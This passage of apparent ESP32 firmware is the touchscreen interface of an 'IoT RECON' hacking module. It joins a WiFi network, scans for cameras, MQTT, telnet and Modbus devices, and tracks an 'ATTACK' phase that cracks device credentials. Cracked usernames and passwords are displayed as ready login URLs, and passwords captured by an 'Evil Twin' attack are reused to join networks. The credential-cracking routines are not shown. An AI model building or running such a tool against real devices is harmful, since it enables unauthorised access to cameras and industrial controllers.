    tft.setCursor(5, SCALE_Y(198));
    tft.print("^ abc/ABC/!@#  < Bksp  _ Space");
}

// =============================================================================
// KEYBOARD TOUCH HANDLER
// =============================================================================

static void handleKeyboardTouch(int x, int y, int maxLen) {
    // Back icon bar
    if (y >= (ICON_BAR_Y - 2) && y <= (ICON_BAR_BOTTOM + 4) && x >= 5 && x <= 30) {
        if (currentScreen == IOT_SCR_KEYBOARD_PASS) {
            currentScreen = IOT_SCR_KEYBOARD_SSID;
            kbInput = String(targetSSID);
            drawKeyboardScreen("Enter SSID:", 32);
        } else {
            currentScreen = IOT_SCR_WIFI_SCAN;
            kbInput = "";
            drawWifiScanScreen();
        }
        waitForTouchRelease();
        return;
    }

    // Keyboard keys
    int yOffset = SCALE_Y(85);
    for (int row = 0; row < 4; row++) {
        int xOffset = 5;
        for (int col = 0; col < (int)strlen(kbLayout[row]); col++) {
            if (x >= xOffset && x <= xOffset + kbKeyW &&
                y >= yOffset && y <= yOffset + kbKeyH) {
                char c = kbLayout[row][col];

                // Visual feedback
                tft.fillRect(xOffset, yOffset, kbKeyW, kbKeyH, HALEHOUND_HOTPINK);
                tft.setTextColor(HALEHOUND_BLACK);
                tft.setCursor(xOffset + kbKeyW / 3, yOffset + kbKeyH / 4);
                tft.print(c);
                delay(80);
                tft.fillRect(xOffset, yOffset, kbKeyW, kbKeyH, HALEHOUND_DARK);
                tft.drawRect(xOffset, yOffset, kbKeyW, kbKeyH, HALEHOUND_GUNMETAL);
                tft.setTextColor(HALEHOUND_MAGENTA);
                tft.setCursor(xOffset + kbKeyW / 3, yOffset + kbKeyH / 4);
                tft.print(c);

                if (c == '<') { // Backspace
                    if (kbInput.length() > 0)
                        kbInput = kbInput.substring(0, kbInput.length() - 1);
                } else if (c == '^') { // Cycle: lower → upper → symbols
                    kbMode = (kbMode + 1) % 3;
                    kbLayout = (kbMode == 0) ? kbLower : (kbMode == 1) ? kbUpper : kbSymbol;
                    drawKeyboardScreen(
                        currentScreen == IOT_SCR_KEYBOARD_SSID ? "Enter SSID:" : "Enter Password:",
                        maxLen);
                    return;
                } else if (c == '_') { // Space
                    if ((int)kbInput.length() < maxLen) kbInput += " ";
                } else {
                    if ((int)kbInput.length() < maxLen) kbInput += c;
                }

                // Redraw input box
                int boxY = SCALE_Y(55);
                tft.fillRect(11, boxY + 1, SCREEN_WIDTH - 22, SCALE_H(25) - 2, HALEHOUND_DARK);
                tft.setTextColor(HALEHOUND_MAGENTA);
                tft.setCursor(15, boxY + 7);
                if (currentScreen == IOT_SCR_KEYBOARD_PASS) {
                    // Show asterisks for password
                    for (int i = 0; i < (int)kbInput.length(); i++) tft.print('*');
                } else {
                    tft.print(kbInput);
                }
                waitForTouchRelease();
                return;
            }
            xOffset += kbKeyW + kbKeySp;
        }
        yOffset += kbKeyH + kbKeySp;
    }

    // Button row
    int btnW = SCALE_W(53);
    int btnH = SCALE_H(22);
    int btnY = SCALE_Y(170);

    // Back button
    if (x >= 5 && x <= 5 + btnW && y >= btnY && y <= btnY + btnH + 3) {
        if (currentScreen == IOT_SCR_KEYBOARD_PASS) {
            currentScreen = IOT_SCR_KEYBOARD_SSID;
            kbInput = String(targetSSID);
            drawKeyboardScreen("Enter SSID:", 32);
        } else {
            currentScreen = IOT_SCR_WIFI_SCAN;
            kbInput = "";
            drawWifiScanScreen();
        }
        waitForTouchRelease();
        return;
    }

    // Clear button
    int clrX = SCALE_X(63);
    if (x >= clrX && x <= clrX + btnW && y >= btnY && y <= btnY + btnH + 3) {
        kbInput = "";
        int boxY2 = SCALE_Y(55);
        tft.fillRect(11, boxY2 + 1, SCREEN_WIDTH - 22, SCALE_H(25) - 2, HALEHOUND_DARK);
        return;
    }

    // Skip button (password screen only — connect with no password)
    if (currentScreen == IOT_SCR_KEYBOARD_PASS) {
        int skipX = SCALE_X(121);
        if (x >= skipX && x <= skipX + btnW && y >= btnY && y <= btnY + btnH + 3) {
            targetPass[0] = '\0';
            kbInput = "";
            currentScreen = IOT_SCR_CONNECTING;
            drawConnectingScreen();
            waitForTouchRelease();
            return;
        }
    }

    // OK button
    int okX = SCALE_X(179);
    if (x >= okX && x <= okX + btnW && y >= btnY && y <= btnY + btnH + 3) {
        if (kbInput.length() > 0 || currentScreen == IOT_SCR_KEYBOARD_PASS) {
            if (currentScreen == IOT_SCR_KEYBOARD_SSID) {
                strncpy(targetSSID, kbInput.c_str(), 32);
                targetSSID[32] = '\0';
                kbInput = "";
                currentScreen = IOT_SCR_KEYBOARD_PASS;
                drawKeyboardScreen("Password (Skip=no pass):", 64);
            } else {
                // Password entered (or empty for open network)
                strncpy(targetPass, kbInput.c_str(), 64);
                targetPass[64] = '\0';
                kbInput = "";
                currentScreen = IOT_SCR_CONNECTING;
                drawConnectingScreen();
            }
        }
        waitForTouchRelease();
        return;
    }
}

// =============================================================================
// DISPLAY: Connecting Screen
// =============================================================================

static void drawConnectingScreen() {
    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawInoIconBar();

    drawGlitchTitle(SCALE_Y(80), "IoT RECON");
    drawGlitchStatus(SCALE_Y(120), "CONNECTING...", HALEHOUND_HOTPINK);

    tft.setTextColor(HALEHOUND_CYAN);
    tft.setTextSize(1);
    tft.setCursor(5, SCALE_Y(150));
    tft.printf("SSID: %s", targetSSID);

    tft.setCursor(5, SCALE_Y(165));
    if (strlen(targetPass) > 0) {
        tft.print("Auth: WPA/WPA2");
    } else {
        tft.print("Auth: OPEN");
    }
}

// =============================================================================
// DISPLAY: Main Scan Screen
// =============================================================================

static void drawScanScreen() {
    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();

    // Icon bar
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_DARK);
    tft.drawBitmap(10, ICON_BAR_Y, bitmap_icon_go_back, 16, 16, HALEHOUND_MAGENTA);
    // Save icon
    tft.drawBitmap(SCREEN_WIDTH - 26, ICON_BAR_Y, bitmap_icon_save, 16, 16, HALEHOUND_MAGENTA);
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);

    // Title
    drawGlitchTitle(SCALE_Y(52), "IoT RECON");
}

// Teal-to-hotpink color gradient (same as Jam Detect / Scanner)
static uint16_t iotGradient(float ratio) {
    if (ratio > 1.0f) ratio = 1.0f;
    if (ratio < 0.0f) ratio = 0.0f;
    uint8_t r = (uint8_t)(ratio * 255);
    uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
    uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
    return tft.color565(r, g, b);
}

// Draw a single stat badge — rounded rect with colored border + value inside
static void drawStatBadge(int x, int y, int w, int h, const char* label, int value, uint16_t borderColor) {
    tft.fillRoundRect(x, y, w, h, 2, HALEHOUND_DARK);
    tft.drawRoundRect(x, y, w, h, 2, borderColor);

    // Label (dim) + value (bright) centered
    char buf[14];
    snprintf(buf, sizeof(buf), "%s:%d", label, value);
    int tw = strlen(buf) * 6;
    int tx = x + (w - tw) / 2;
    if (tx < x + 2) tx = x + 2;

    tft.setTextSize(1);
    tft.setTextColor(borderColor, HALEHOUND_DARK);
    tft.setCursor(tx, y + (h - 8) / 2);
    tft.print(buf);
}

static void drawStats() {
    int y = SCALE_Y(70);
    tft.fillRect(0, y, SCREEN_WIDTH, SCALE_H(50), HALEHOUND_BLACK);

    // ── Phase calculation ──
    const char* phaseStr = "IDLE";
    int progress = 0;
    switch (scanPhase) {
        case IOT_PHASE_DISCOVER:
            phaseStr = "SCANNING";
            progress = (currentScanIP * 100) / 254;
            break;
        case IOT_PHASE_IDENTIFY:
            phaseStr = "IDENTIFY";
            progress = 100;
            break;
        case IOT_PHASE_ATTACK:
            phaseStr = "ATTACK";
            if (deviceCount > 0)
                progress = ((currentAttackDevice + 1) * 100) / deviceCount;
            break;
        case IOT_PHASE_DONE:
            phaseStr = "COMPLETE";
            progress = 100;
            break;
        default: break;
    }

    // ── HERO PROGRESS BAR — 16px tall, rounded, teal→hotpink gradient ──
    int barX = 5;
    int barW = SCREEN_WIDTH - 10;
    int barH = 16;
    int barY = y;

    // Rounded border — magenta when active, hotpink when complete
    uint16_t borderColor = (scanPhase == IOT_PHASE_DONE) ? HALEHOUND_HOTPINK : HALEHOUND_MAGENTA;
    tft.drawRoundRect(barX, barY, barW, barH, 3, borderColor);

    // Gradient fill
    int fillW = constrain((progress * (barW - 4)) / 100, 0, barW - 4);
    for (int px = 0; px < fillW; px++) {
        float t = (float)px / (float)(barW - 4);
        tft.drawFastVLine(barX + 2 + px, barY + 2, barH - 4, iotGradient(t));
    }
    // Clear unfilled region
    if (fillW < barW - 4) {
        tft.fillRect(barX + 2 + fillW, barY + 2, barW - 4 - fillW, barH - 4, HALEHOUND_DARK);
    }

    // Phase text overlaid LEFT side of bar
    tft.setTextSize(1);
    tft.setTextColor(TFT_WHITE);
    tft.setCursor(barX + 5, barY + 4);
    tft.print(phaseStr);
    if (scanPhase == IOT_PHASE_DISCOVER) {
        tft.setTextColor(HALEHOUND_CYAN);
        tft.printf(" .%d", (int)currentScanIP);
    }
    if (scanPhase == IOT_PHASE_ATTACK && deviceCount > 0) {
        tft.setTextColor(HALEHOUND_CYAN);
        tft.printf(" [%d/%d]", currentCredIndex + 1, totalCredCount);
    }

    // Percentage overlaid RIGHT side
    char pctBuf[8];
    snprintf(pctBuf, sizeof(pctBuf), "%d%%", progress);
    int pctW = strlen(pctBuf) * 6;
    tft.setTextColor(TFT_WHITE);
    tft.setCursor(barX + barW - pctW - 5, barY + 4);
    tft.print(pctBuf);

    // ── Gradient divider ──
    int divY = barY + barH + 2;
    for (int gx = 0; gx < SCREEN_WIDTH; gx++)
        tft.drawFastVLine(gx, divY, 1, iotGradient((float)gx / SCREEN_WIDTH));

    // ── STATS ROW 1: 4 badges ──
    int badgeY = divY + 3;
    int badgeH = 13;
    int gap = 3;
    int badgeW = (SCREEN_WIDTH - 10 - gap * 3) / 4;  // ~54px each

    drawStatBadge(5,                          badgeY, badgeW, badgeH, "H",   (int)hostsFound,     HALEHOUND_CYAN);
    drawStatBadge(5 + (badgeW + gap),         badgeY, badgeW, badgeH, "Cam", (int)camerasFound,   HALEHOUND_MAGENTA);
    drawStatBadge(5 + (badgeW + gap) * 2,     badgeY, badgeW, badgeH, "Crk", (int)camerasCracked, HALEHOUND_HOTPINK);
    drawStatBadge(5 + (badgeW + gap) * 3,     badgeY, badgeW, badgeH, "Opn", (int)openServices,   HALEHOUND_GREEN);

    // ── STATS ROW 2: 3 badges, centered ──
    int row2Y = badgeY + badgeH + 2;
    int badgeW2 = (SCREEN_WIDTH - 10 - gap * 2) / 3;  // ~74px each

    drawStatBadge(5,                          row2Y, badgeW2, badgeH, "MQTT", (int)mqttFound,    HALEHOUND_CYAN);
    drawStatBadge(5 + (badgeW2 + gap),        row2Y, badgeW2, badgeH, "Tel",  (int)telnetFound,  HALEHOUND_VIOLET);
    drawStatBadge(5 + (badgeW2 + gap) * 2,    row2Y, badgeW2, badgeH, "Mod",  (int)modbusFound,  HALEHOUND_MAGENTA);

    // ── Bottom gradient divider (into kill feed) ──
    int divY2 = row2Y + badgeH + 2;
    for (int gx = 0; gx < SCREEN_WIDTH; gx++)
        tft.drawFastVLine(gx, divY2, 1, iotGradient((float)gx / SCREEN_WIDTH));
}

// =============================================================================
// DISPLAY: Kill Feed
// =============================================================================

static void drawKillFeed() {
    if (!killFeedDirty) return;
    killFeedDirty = false;

    int feedY = SCALE_Y(125);
    int feedH = SCALE_Y(290) - feedY;
    int lineH = 12;
    int maxLines = feedH / lineH;

    // Clear feed area
    tft.fillRect(0, feedY, SCREEN_WIDTH, feedH, HALEHOUND_BLACK);

    int startIdx = killFeedScroll;
    if (startIdx + maxLines > killFeedCount) {
        startIdx = killFeedCount - maxLines;
    }
    if (startIdx < 0) startIdx = 0;

    tft.setTextSize(1);
    for (int i = startIdx; i < killFeedCount && (i - startIdx) < maxLines; i++) {
        int y = feedY + (i - startIdx) * lineH;
        tft.setTextColor(killFeed[i].color);
        tft.setCursor(3, y + 1);
        tft.print(killFeed[i].text);
    }

    // Bottom bar
    int btnY = SCALE_Y(292);
    tft.fillRect(0, btnY, SCREEN_WIDTH, SCREEN_HEIGHT - btnY, HALEHOUND_DARK);

    // Scroll buttons
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(5, btnY + 4);
    tft.print("UP");
    tft.setCursor(SCALE_X(55), btnY + 4);
    tft.print("DN");

    // Save button
    tft.setCursor(SCALE_X(120), btnY + 4);
    tft.setTextColor(HALEHOUND_GREEN);
    tft.print("SAVE");

    // Exit button
    tft.setCursor(SCREEN_WIDTH - 30, btnY + 4);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.print("EXIT");
}

// =============================================================================
// DISPLAY: Device Detail View
// =============================================================================

static void drawDetailView(int idx) {
    if (idx < 0 || idx >= deviceCount) return;
    IotDevice& dev = devices[idx];

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawInoIconBar();

    char ipStr[16];
    ipToStr(dev.ip, ipStr, sizeof(ipStr));

    // IP + type
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setTextSize(1);
    tft.setCursor(5, SCALE_Y(45));
    tft.printf("IP: %s", ipStr);

    const char* typeStr = "Unknown";
    switch (dev.type) {
        case IOT_CAMERA:       typeStr = "IP Camera";      break;
        case IOT_MQTT_BROKER:  typeStr = "MQTT Broker";    break;
        case IOT_TELNET_DEVICE:typeStr = "Telnet Device";  break;
        case IOT_MODBUS_PLC:   typeStr = "Modbus PLC";     break;
        case IOT_HTTP_DEVICE:  typeStr = "HTTP Device";    break;
        default: break;
    }

    tft.setCursor(5, SCALE_Y(60));
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.printf("Type: %s", typeStr);

    // Status
    tft.setCursor(5, SCALE_Y(75));
    switch (dev.status) {
        case IOT_CRACKED:
            tft.setTextColor(HALEHOUND_HOTPINK);
            tft.print("Status: CRACKED");
            break;
        case IOT_OPEN:
            tft.setTextColor(HALEHOUND_GREEN);
            tft.print("Status: OPEN");
            break;
        case IOT_LOCKED:
            tft.setTextColor(HALEHOUND_GUNMETAL);
            tft.print("Status: LOCKED");
            break;
        default:
            tft.setTextColor(HALEHOUND_CYAN);
            tft.print("Status: FOUND");
            break;
    }

    // Banner
    tft.setCursor(5, SCALE_Y(95));
    tft.setTextColor(HALEHOUND_CYAN);
    tft.printf("Banner: %s", dev.banner);

    // Ports
    tft.setCursor(5, SCALE_Y(110));
    tft.setTextColor(HALEHOUND_VIOLET);
    tft.print("Ports:");
    for (int p = 0; p < IOT_MAX_PORTS; p++) {
        if (dev.openPorts & (1 << p)) {
            tft.printf(" %d(%s)", scanPorts[p], portNames[p]);
        }
    }

    // Credentials + access URLs
    if (dev.status == IOT_CRACKED) {
        tft.setCursor(5, SCALE_Y(130));
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.printf("User: %s", dev.credUser);
        tft.setCursor(5, SCALE_Y(145));
        tft.printf("Pass: %s", dev.credPass);

        int urlY = SCALE_Y(165);
        tft.setTextColor(HALEHOUND_GREEN);
        tft.setTextSize(1);

        if (dev.openPorts & 0x01) {
            tft.setCursor(5, urlY);
            tft.printf("rtsp://%s:%s@%s:554/", dev.credUser, dev.credPass, ipStr);
            urlY += SCALE_H(15);
        }
        if (dev.openPorts & 0x02) {
            tft.setCursor(5, urlY);
            tft.printf("http://%s:%s@%s/", dev.credUser, dev.credPass, ipStr);
            urlY += SCALE_H(15);
        }
        if (dev.openPorts & 0x04) {
            tft.setCursor(5, urlY);
            tft.printf("http://%s:%s@%s:8080/", dev.credUser, dev.credPass, ipStr);
            urlY += SCALE_H(15);
        }
        if (dev.openPorts & 0x40) {
            tft.setCursor(5, urlY);
            tft.printf("https://%s:%s@%s/", dev.credUser, dev.credPass, ipStr);
            urlY += SCALE_H(15);
        }
        if (dev.openPorts & 0x08) {
            tft.setCursor(5, urlY);
            tft.setTextColor(HALEHOUND_CYAN);
            tft.printf("telnet %s  %s:%s", ipStr, dev.credUser, dev.credPass);
            urlY += SCALE_H(15);
        }
    }

    // MQTT info
    if (dev.type == IOT_MQTT_BROKER && dev.status == IOT_OPEN) {
        tft.setCursor(5, SCALE_Y(130));
        tft.setTextColor(HALEHOUND_GREEN);
        tft.printf("Auth: NONE (open broker)");
        tft.setCursor(5, SCALE_Y(145));
        tft.printf("mqtt://%s:1883/", ipStr);
        tft.setCursor(5, SCALE_Y(160));
        tft.printf("Topics captured: %d", dev.mqttTopics);
    }

    // Back hint
    tft.setCursor(5, SCALE_Y(280));
    tft.setTextColor(HALEHOUND_GUNMETAL);
    tft.print("Tap back to return");
}

// =============================================================================
// HANDLE WIFI SCAN SCREEN TOUCH
// =============================================================================

static void handleWifiScanTouch(int x, int y) {
    // Network list tap
    int listY = SCALE_Y(115);
    int lineH = SCALE_H(18);
    int visibleLines = (SCALE_Y(280) - listY) / lineH;

    for (int i = 0; i < visibleLines && (i + networkScroll) < networkCount; i++) {
        int itemY = listY + i * lineH;
        if (y >= itemY && y < itemY + lineH) {
            int netIdx = i + networkScroll;
            strncpy(targetSSID, foundNetworks[netIdx].ssid, 32);
            targetSSID[32] = '\0';

            if (foundNetworks[netIdx].encType == WIFI_AUTH_OPEN) {
                // Open network — skip password
                targetPass[0] = '\0';
                currentScreen = IOT_SCR_CONNECTING;
                drawConnectingScreen();
            } else {
                // Need password
                kbInput = "";
                currentScreen = IOT_SCR_KEYBOARD_PASS;
                drawKeyboardScreen("Enter Password:", 64);
            }
            waitForTouchRelease();
            return;
        }
    }

    // Button bar
    int btnY = SCALE_Y(290);
    int btnW = SCALE_W(70);
    int btnH = SCALE_H(22);

    // Rescan
    if (x >= 5 && x <= 5 + btnW && y >= btnY && y <= btnY + btnH + 3) {
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.setCursor(5, SCALE_Y(100));
        tft.print("Scanning...              ");
        doWifiScan();
        drawWifiScanScreen();
        waitForTouchRelease();
        return;
    }

    // Manual SSID
    int manX = SCALE_X(82);
    if (x >= manX && x <= manX + btnW && y >= btnY && y <= btnY + btnH + 3) {
        kbInput = "";
        currentScreen = IOT_SCR_KEYBOARD_SSID;
        drawKeyboardScreen("Enter SSID:", 32);
        waitForTouchRelease();
        return;
    }

    // Captured Creds (from Evil Twin)
    int credX = SCALE_X(162);
    if (x >= credX && x <= credX + btnW && y >= btnY && y <= btnY + btnH + 3) {
        loadCapturedCreds();
        credScroll = 0;
        currentScreen = IOT_SCR_CREDS;
        drawCredsScreen();
        waitForTouchRelease();
        return;
    }
}

// =============================================================================
// HANDLE SCAN SCREEN TOUCH
// =============================================================================

static void handleScanScreenTouch(int x, int y) {
    // Back icon
    if (y >= (ICON_BAR_Y - 2) && y <= (ICON_BAR_BOTTOM + 4) && x >= 5 && x <= 30) {
        exitRequested = true;
        waitForTouchRelease();
        return;
    }

    // Save icon (top right)
    if (y >= (ICON_BAR_Y - 2) && y <= (ICON_BAR_BOTTOM + 4) && x >= SCREEN_WIDTH - 30) {
        saveReportToSD();
        // Brief confirmation
        tft.fillRect(SCALE_X(60), SCALE_Y(140), SCALE_W(120), SCALE_H(30), HALEHOUND_DARK);
        tft.drawRect(SCALE_X(60), SCALE_Y(140), SCALE_W(120), SCALE_H(30), HALEHOUND_GREEN);
        tft.setTextColor(HALEHOUND_GREEN);
        tft.setCursor(SCALE_X(75), SCALE_Y(150));
        tft.print(sdReady ? "Saved to SD!" : "SD Error!");
        delay(1000);
        killFeedDirty = true;
        waitForTouchRelease();
        return;
    }

    // Kill feed area — tap on a line to see device detail
    int feedY = SCALE_Y(125);
    int feedH = SCALE_Y(290) - feedY;
    int lineH = 12;
    int maxLines = feedH / lineH;

    if (y >= feedY && y < feedY + feedH) {
        int lineIdx = (y - feedY) / lineH;
        int startIdx = 0;
        if (killFeedCount > maxLines) startIdx = killFeedCount - maxLines;
        int feedIdx = startIdx + lineIdx;

        // Try to match feed line to a device
        if (feedIdx >= 0 && feedIdx < killFeedCount) {
            // Parse IP from kill feed line to find matching device
            String line = killFeed[feedIdx].text;
            // Look for IP pattern in the line
            for (int d = 0; d < deviceCount; d++) {
                char ipStr[16];
                ipToStr(devices[d].ip, ipStr, sizeof(ipStr));
                if (line.indexOf(ipStr) >= 0) {
                    detailDeviceIdx = d;
                    currentScreen = IOT_SCR_DETAIL;
                    drawDetailView(d);
                    waitForTouchRelease();
                    return;
                }
            }
        }
    }

    // Bottom bar
    int btnBarY = SCALE_Y(292);

    // Scroll — left side of bottom bar
    if (y >= btnBarY && x < SCALE_X(50)) {
        // Scroll UP (see older messages)
        if (killFeedScroll > 0) {
            killFeedScroll--;
            killFeedDirty = true;
        }
        return;
    }
    if (y >= btnBarY && x >= SCALE_X(50) && x < SCALE_X(100)) {
        // Scroll DOWN (see newer messages)
        int feedH = SCALE_Y(290) - SCALE_Y(125);
        int maxLines = feedH / 12;
        if (killFeedCount > maxLines && killFeedScroll < killFeedCount - maxLines) {
            killFeedScroll++;
            killFeedDirty = true;
        }
        return;
    }

    // Save button
    if (y >= btnBarY && x >= SCALE_X(110) && x < SCALE_X(160)) {
        saveReportToSD();
        tft.fillRect(SCALE_X(60), SCALE_Y(140), SCALE_W(120), SCALE_H(30), HALEHOUND_DARK);
        tft.drawRect(SCALE_X(60), SCALE_Y(140), SCALE_W(120), SCALE_H(30), HALEHOUND_GREEN);
        tft.setTextColor(HALEHOUND_GREEN);
        tft.setCursor(SCALE_X(75), SCALE_Y(150));
        tft.print(sdReady ? "Saved to SD!" : "SD Error!");
        delay(1000);
        killFeedDirty = true;
        return;
    }

    // Exit button
    if (y >= btnBarY && x >= SCREEN_WIDTH - 40) {
        exitRequested = true;
        return;
    }
}

// =============================================================================
// MODULE LIFECYCLE: setup()
// =============================================================================

namespace IotRecon {

void setup() {
    // Reset all state
    deviceCount = 0;
    currentScanIP = 0;
    scanPhase = IOT_PHASE_CONNECT;
    scanRunning = false;
    scanDone = false;
    exitRequested = false;
    newEventFlag = false;
    camerasFound = 0;
    camerasCracked = 0;
    mqttFound = 0;
    telnetFound = 0;
    modbusFound = 0;
    hostsFound = 0;
    openServices = 0;
    currentCredIndex = 0;
    currentAttackDevice = 0;
    wifiConnected = false;
    killFeedCount = 0;
    killFeedScroll = 0;
    killFeedDirty = true;
    targetSSID[0] = '\0';
    targetPass[0] = '\0';
    networkCount = 0;
    networkScroll = 0;
    currentScreen = IOT_SCR_WIFI_SCAN;
    detailDeviceIdx = -1;
    kbInput = "";
    kbMode = 0;
    kbLayout = kbLower;
    lastStatsDraw = 0;
    scanStartTime = 0;
    sdReady = false;
    autoSaved = false;
    lastTouchTime = 0;

    memset(devices, 0, sizeof(devices));
    memset(killFeed, 0, sizeof(killFeed));

    initPlague();

    // Show screen immediately, then scan in background
    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawInoIconBar();
    drawGlitchTitle(SCALE_Y(55), "IoT RECON");
    drawGlitchStatus(SCALE_Y(80), "SELECT TARGET", HALEHOUND_HOTPINK);
    tft.setTextColor(HALEHOUND_CYAN);
    tft.setTextSize(1);
    tft.setCursor(5, SCALE_Y(100));
    tft.print("Scanning WiFi networks...");

    // Now do the blocking WiFi scan (2-4 sec)
    doWifiScan();
    drawWifiScanScreen();
}

// =============================================================================
// MODULE LIFECYCLE: loop()
// =============================================================================

void loop() {
    touchButtonsUpdate();
    uint16_t tx, ty;
    bool touched = getTouchPoint(&tx, &ty);

    // Debounce — ignore touches within 150ms of last processed touch
    if (touched && (millis() - lastTouchTime < IOT_DEBOUNCE_MS)) {
        touched = false;
    }

    // Boot button = instant exit (IS_BOOT_PRESSED returns false on E32R28T
    // where GPIO0 is permanently LOW due to CC1101 E07 PA module)
    if (IS_BOOT_PRESSED()) {
        exitRequested = true;
        return;
    }

    switch (currentScreen) {

        case IOT_SCR_WIFI_SCAN:
            // Back icon
            if (touched && ty >= (ICON_BAR_Y - 2) && ty <= (ICON_BAR_BOTTOM + 4) && tx >= 5 && tx <= 30) {
                lastTouchTime = millis();
                exitRequested = true;
                waitForTouchRelease();
                return;
            }
            if (touched) {
                lastTouchTime = millis();
                handleWifiScanTouch(tx, ty);
            }
            break;

        case IOT_SCR_CREDS:
            if (touched) {
                lastTouchTime = millis();
                handleCredsTouch(tx, ty);
            }
            break;

        case IOT_SCR_KEYBOARD_SSID:
            if (touched) {
                lastTouchTime = millis();
                handleKeyboardTouch(tx, ty, 32);
            }
            break;

        case IOT_SCR_KEYBOARD_PASS:
            if (touched) {
                lastTouchTime = millis();
                handleKeyboardTouch(tx, ty, 64);
            }
            break;

        case IOT_SCR_CONNECTING:
        {
            // Attempt WiFi connection
            bool ok = tryWiFiConnect();
            if (ok) {
                // Connected — show info and start scan
                tft.setCursor(5, SCALE_Y(185));
                tft.setTextColor(HALEHOUND_GREEN);
                tft.printf("Connected! IP: %d.%d.%d.%d", localIP[0], localIP[1], localIP[2], localIP[3]);
                tft.setCursor(5, SCALE_Y(200));
                tft.printf("Gateway: %d.%d.%d.%d", gatewayIP[0], gatewayIP[1], gatewayIP[2], gatewayIP[3]);
                delay(1500);

                // Switch to scan screen and launch Core 0 task
                currentScreen = IOT_SCR_SCANNING;
                scanStartTime = millis();
                drawScanScreen();
                startScanTask();
            } else {
                tft.setCursor(5, SCALE_Y(185));
                tft.setTextColor(RED);
                tft.print("Connection FAILED!");
                tft.setCursor(5, SCALE_Y(200));
                tft.setTextColor(HALEHOUND_GUNMETAL);
                tft.print("Check SSID/password");
                delay(2000);
                currentScreen = IOT_SCR_WIFI_SCAN;
                WiFi.disconnect();
                WiFi.mode(WIFI_OFF);
                delay(100);
                doWifiScan();
                drawWifiScanScreen();
            }
            break;
        }

        case IOT_SCR_SCANNING:
        {
            // Update stats display periodically
            if (millis() - lastStatsDraw > 500) {
                drawStats();
                lastStatsDraw = millis();
            }

            // Update kill feed when new events arrive
            if (newEventFlag) {
                newEventFlag = false;
                killFeedDirty = true;
            }
            drawKillFeed();

            // Digital Plague animation — DISABLED: fights with kill feed text
            // TODO: re-enable once plague draws as background behind text
            if (false && scanPhase != IOT_PHASE_DONE) {
                updatePlagueAnimation();
            }

            // Touch handling
            if (touched) {
                lastTouchTime = millis();
                handleScanScreenTouch(tx, ty);
            }

            // Auto-save when scan completes
            if (scanPhase == IOT_PHASE_DONE && !scanDone) {
                // Wait a moment for task to fully exit
                delay(100);
            }
            if (scanDone && scanPhase == IOT_PHASE_DONE) {
                if (!autoSaved) {
                    saveReportToSD();
                    autoSaved = true;
                    if (sdReady) {
                        addKillLine("[SD] Report saved to /iot_recon.txt", HALEHOUND_GREEN);
                        killFeedDirty = true;
                    }
                }
            }
            break;
        }

        case IOT_SCR_DETAIL:
            if (touched) {
                lastTouchTime = millis();
                // Any tap on back icon or boot button returns to scan
                if ((ty >= (ICON_BAR_Y - 2) && ty <= (ICON_BAR_BOTTOM + 4) && tx >= 5 && tx <= 30) ||
                    buttonPressed(BTN_BACK)) {
                    currentScreen = IOT_SCR_SCANNING;
                    drawScanScreen();
                    lastStatsDraw = 0; // Force redraw
                    killFeedDirty = true;
                    waitForTouchRelease();
                }
            }
            if (isInoBackTapped()) {
                currentScreen = IOT_SCR_SCANNING;
                drawScanScreen();
                lastStatsDraw = 0;
                killFeedDirty = true;
            }
            break;
    }
}

// =============================================================================
// MODULE LIFECYCLE: isExitRequested()
// =============================================================================

bool isExitRequested() {
    return exitRequested;
}

// =============================================================================
// MODULE LIFECYCLE: cleanup()
// =============================================================================

void cleanup() {
    // Stop Core 0 task
    stopScanTask();

    // Disconnect WiFi
    WiFi.disconnect();
    WiFi.mode(WIFI_OFF);
    delay(100);

    // Reset state
    exitRequested = false;
    wifiConnected = false;
    scanPhase = IOT_PHASE_CONNECT;
    deviceCount = 0;
    killFeedCount = 0;
}

}  // namespace IotRecon
